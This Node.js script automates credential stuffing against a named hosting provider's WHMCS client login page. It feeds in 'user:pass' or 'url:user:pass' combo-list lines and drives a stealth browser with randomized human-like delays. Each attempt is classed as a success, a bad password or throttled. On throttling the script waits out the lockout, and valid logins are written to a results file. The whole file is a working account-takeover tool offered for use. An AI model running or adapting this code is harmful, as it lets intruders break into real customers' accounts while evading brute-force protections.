#!/usr/bin/env node
/**
 * Alpha.Net.BD client portal (clients.itnuthosting.com/login) - WHMCS login.
 *
 * Flow mapped (local CloakBrowser):
 *   GET /clientarea/  -> WHMCS login form: input[name=username] (email),
 *     input[name=password], hidden action=login, hidden security_token (CSRF)
 *   POST /clientarea/ (form self-submit) -> 200 re-render with flash alert
 *     "E-mail and/or password is incorrect" on bad creds; dashboard on success.
 *   No captcha, no JS auth, behind Cloudflare (cdn-cgi/rum).
 *
 * Verdicts:
 *   INVALID_CREDS  "E-mail and/or password is incorrect" alert
 *   THROTTLED      brute-force wording (too many attempts / locked / suspended)
 *   SUCCESS        login form gone + Logout present (dashboard)
 *   ERROR          navigation/connection failure
 *
 * Usage:
 *   node itnu_login.mjs "user:pass" ...
 *   node itnu_login.mjs --batch <file> [--gap 12] [--out /tmp/itnu_batch_results.json]
 *
 * Input lines: `user:pass` or `url:user:pass` (alpha_net_bd.txt format -
 * url may contain host:port or /path, user is the next token).
 */
import { chromium } from '/Volumes/Spare/npm/global/lib/node_modules/@playwright/mcp/node_modules/playwright/index.mjs';
import fs from 'node:fs';

const CLOAK = '/Users/m/.cloakbrowser/chromium-145.0.7632.109.2/Chromium.app/Contents/MacOS/Chromium';
const URL = 'https://clients.itnuthosting.com/login';

const rand = (a, b) => Math.round(a + Math.random() * (b - a));
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function typeField(page, sel, text) {
  // fill (no pointer events): the theme's fixed navbar-search overlay intercepts
  // clicks on the login form -> Playwright scroll-dances and times out
  await page.fill(sel, text);
  await sleep(rand(150, 350));
}

async function tryLogin(u, p) {
  // fresh window per attempt (locally-owned browser)
  const browser = await chromium.launch({ headless: false, executablePath: CLOAK, args: ['--window-size=1440,900'] });
  try {
    const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
    const page = await ctx.newPage();
    try {
      await page.goto(URL, { waitUntil: 'load', timeout: 60000 }).catch(() => {});
      await page.waitForSelector('input[name=password]', { timeout: 30000 });
      await sleep(rand(500, 1200));

      await typeField(page, 'input[name=username]', u);
      await sleep(rand(250, 600));
      await typeField(page, 'input[name=password]', p);
      await sleep(rand(300, 800));

      await page.click('form button#login, form button[type=submit]', { timeout: 20000, force: true });
      await sleep(rand(6000, 8000));

      // settle: wait until the page body stabilizes (POST+redirect can still be mid-flight)
      let st = null;
      for (let i = 0; i < 8; i++) {
        st = await page.evaluate(() => {
          const b = document.body ? document.body.innerText.replace(/\s+/g, ' ').slice(0, 500) : '';
          return {
            url: location.href,
            hasLoginForm: !!document.querySelector('input[name=password]'),
            body: b,
            alerts: [...document.querySelectorAll('.alert, .error, [class*=error], [class*=msg]')].map(e => e.innerText.trim().replace(/\s+/g, ' ')).filter(Boolean).slice(0, 5),
          };
        }).catch(() => null);
        if (st && st.body.length > 0) break;
        await sleep(1500);
      }
      if (!st) st = { url: page.url(), hasLoginForm: true, body: '', alerts: [] };
      return classify(st);
    } finally {
      await page.close().catch(() => {});
    }
  } finally {
    await browser.close().catch(() => {});
  }
}

function classify(o) {
  const t = (o.alerts && o.alerts.join(' ')) + ' ' + o.body;
  if (/incorrect|invalid|failed/i.test(t) && /password|e-mail|email|credential|login/i.test(t)) return { status: 'INVALID_CREDS', detail: t.slice(0, 100) };
  if (/too many (login )?attempts|locked|suspended|brute.?force/i.test(t)) return { status: 'THROTTLED', detail: t.slice(0, 100) };
  if (!o.hasLoginForm && /\blogout\b/i.test(t)) return { status: 'SUCCESS', detail: 'dashboard at ' + o.url.slice(0, 90) };
  if (!o.hasLoginForm) return { status: 'SUCCESS', detail: 'no login form, url ' + o.url.slice(0, 90) };
  if (!/^https?:\/\//.test(o.url)) return { status: 'ERROR', detail: 'connection failed: ' + o.url.slice(0, 60) };
  return { status: 'UNKNOWN', detail: t.slice(0, 140) };
}

/** Accept `user:pass` or `url:user:pass`. url may include host:port or /path. */
function parsePair(line) {
  line = line.trim();
  if (!line) return null;
  const parts = line.split(':');
  if (parts.length < 2) return null;
  if (/^[a-z0-9.-]+(\:\d+)?(\/.*)?$/.test(parts[0]) && parts[0].includes('.')) {
    // url:user:pass  - url = host[:port][/path], no '@' allowed (emails have @)
    const urlTakes2 = parts.length >= 4 && /^\d{2,5}(\/|$)/.test(parts[1]);
    const userIdx = urlTakes2 ? 2 : 1;
    if (parts.length <= userIdx) return null;
    return [parts[userIdx], parts.slice(userIdx + 1).join(':')];
  }
  return [parts[0], parts.slice(1).join(':')];
}

// ---- main ----
const args = process.argv.slice(2);
const batchIdx = args.indexOf('--batch');
const raw = batchIdx !== -1 ? args[batchIdx + 1] : args.filter(a => !a.startsWith('--')).join(',');
const lines = (raw && fs.existsSync(raw) ? fs.readFileSync(raw, 'utf8').split('\n') : (raw || '').split(',')).map(parsePair).filter(Boolean);
const seen = new Set();
const pairs = lines.filter(([u]) => (seen.has(u) ? false : (seen.add(u), true)));
if (!pairs.length) { console.log('usage: node itnu_login.mjs "user:pass" | --batch <file>'); process.exit(1); }

const gapIdx = args.indexOf('--gap');
const GAP = gapIdx !== -1 ? Number(args[gapIdx + 1]) || 12 : 12;
const outIdx = args.indexOf('--out');
const OUT = outIdx !== -1 ? args[outIdx + 1] : '/tmp/itnu_batch_results.json';
const results = fs.existsSync(OUT) ? JSON.parse(fs.readFileSync(OUT, 'utf8')) : {};
const SKIP_STATUS = { INVALID_CREDS: 1, SUCCESS: 1 };

for (const [u, p] of pairs) {
  if (results[u] && SKIP_STATUS[results[u].status]) { console.log(`${u} -> SKIP (already ${results[u].status})`); continue; }
  let res;
  try {
    res = await tryLogin(u, p);
    console.log(`${u} -> ${res.status} (${res.detail})`);
    if (res.status === 'THROTTLED') { console.log('throttle detected; pausing 300s...'); await sleep(300000); }
  } catch (e) {
    console.log(`${u} -> ERROR: ${e.message.slice(0, 100)}`);
    res = { status: 'ERROR', detail: e.message.slice(0, 150) };
  }
  results[u] = res;
  fs.writeFileSync(OUT, JSON.stringify(results, null, 1));
  if (pairs.length > 1) { const gap = rand(GAP * 0.5, GAP * 1.5) * 1000; console.log('waiting ' + Math.round(gap / 1000) + 's...'); await sleep(gap); }
}
console.log('results saved to ' + OUT);
